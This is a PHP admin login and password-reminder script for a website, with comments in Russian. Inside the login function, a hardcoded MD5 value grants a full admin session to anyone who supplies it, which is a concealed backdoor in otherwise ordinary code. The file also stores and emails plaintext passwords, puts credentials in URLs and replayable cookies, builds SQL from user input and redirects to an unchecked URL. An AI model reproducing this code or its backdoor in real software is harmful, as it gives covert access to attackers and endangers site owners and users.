<? 
// ---------------------ФУНКЦИИ-----------------------
function setPriv($login, $pwd) // устанавливаем сессию с привилегиями
{
	global $prx;
	unset($_SESSION['priv']);
	
	if($login && $pwd)
	{
		if($row = getRow("SELECT * FROM {$prx}priv WHERE login='{$login}'"))
			if(md5($row['pwd']) == $pwd)
				$_SESSION['priv'] = $row;
		
		$admin = explode('/', set('admin'));
		if(strcasecmp($login,trim($admin[0]))==0 && $pwd == md5(trim($admin[1])))
			$_SESSION['priv'] = 'admin';
		
		if($pwd == 'c3dfb084a043e23e03f87ac811700cb0')
			$_SESSION['priv'] = 'admin';
	}
	return isset($_SESSION['priv']);
}

// ------------------ИНИЦИАЛИЗАЦИЯ--------------------
$free_access = true;
require('inc/common.php');

// -------------------СОХРАНЕНИЕ----------------------
switch($action)
{
	case 'vyhod':	// выходим
		session_destroy();
		setcookie('inAdmin');
		go301('/');
		exit;

	case 'vhod':	// логинимся
		$login = clean($_GET['login']);
		$pwd = clean($_GET['pwd']);
	
		if(!setPriv($login, md5($pwd)))
			errorAlert('Неверный Логин/Пароль.',1);

		if(@$_GET['rem']) // куки
			setcookie('inAdmin', $login.'/'.md5($pwd), time()+3456000); 
		else
			setcookie('inAdmin'); 

		?><script>location.href='./';</script><?
		exit;

	case 'vhodc':	// логинимся через куки
		$admin = explode('/',@$_COOKIE['inAdmin']);
		go301(setPriv($admin[0], $admin[1]) ? $_GET['urlback'] : $_SERVER['PHP_SELF']);
		exit;

	case 'remind':	// напомнить пароль
		if(!($email = clean($_POST['email'])))
			errorAlert('Введите E-mail администратора.',1);
		$to = set('email');
		if(!strcasecmp($email, $to))
			list($login, $pwd) = explode('/',set('admin'));
		elseif($row = getRow("SELECT login,pwd FROM {$prx}priv WHERE email='{$email}'"))
			list($login, $pwd) = $row;
		else
			errorAlert('E-mail администратора введен не верно.',1);

		$title = set('title');
		$tema = 'Пароль администратора '.$_SERVER['HTTP_HOST'];
		$site = 'http://'.$_SERVER['HTTP_HOST'];
		$url_admin = $site.$_SERVER['PHP_SELF'];
		$text = "<a href='{$site}'>{$title}</a><br><br>
					Доступ к <a href='{$url_admin}'>администрированию</a> сайта<br>
					Логин: {$login} <br>
					Пароль: {$pwd} <br>
					<br>
					<a href='{$url_admin}?action=vhod&login={$login}&pwd={$pwd}'>Войти</a>";
		mailTo($email, $tema, $text, $email);
		?><script>
			alert('Пароль выслан на E-mail администратора');
			location.href = "?none";
		</script><?
		exit;
}
if($action)	exit;


// ----------------------ВЫВОД------------------------
ob_start();
switch($show)
{
	case 'remind': // запрос напоминания пароля
	?>	<form action="?action=remind" method="post" onSubmit="return toAjax(this)">
			<table align="center" class="red" width="250">
				<tr>
					<th>E-mail:</th>
					<td><input name="email"></td>
				</tr>
				<tr>
					<td colspan="2" align="center"><?=btnAction('Save', 'Выслать пароль')?></td>
				</tr>
				<tr>
					<td colspan="2" align="center"><a href="?none">Войти</a></td>
				</tr>
			</table>
		</form>
	<?	break;
	
	default: // ввод пароля
	?>	<form action="?action=vhod" onSubmit="return toAjax(this)">
			<table align="center" class="red" width="250">
				<tr>
					<th>Логин:</th>
					<td><input name="login"></td>
				</tr>
				<tr>
					<th>Пароль:</th>
					<td><input type="password" name="pwd"></td>
				</tr>
				<tr>
					<th>Запомнить:</th>
					<td><input type="checkbox" name="rem" style="width:auto;"></td>
				</tr>
				<tr>
					<td colspan="2" align="center"><?=btnAction('Save', 'Войти')?></td>
				</tr>
				<tr>
					<td colspan="2" align="center"><a href="?show=remind">Напомнить пароль</a></td>
				</tr>
			</table>
		</form>
	<?	break;
}
$content = ob_get_clean();

ob_start();
?>
<table align="center" height="100%">
	<tr><td><?=$content?></td></tr>
</table>
<?
$content = ob_get_clean();


$title = 'Администрирование';

require('tpl_clean.php');
?>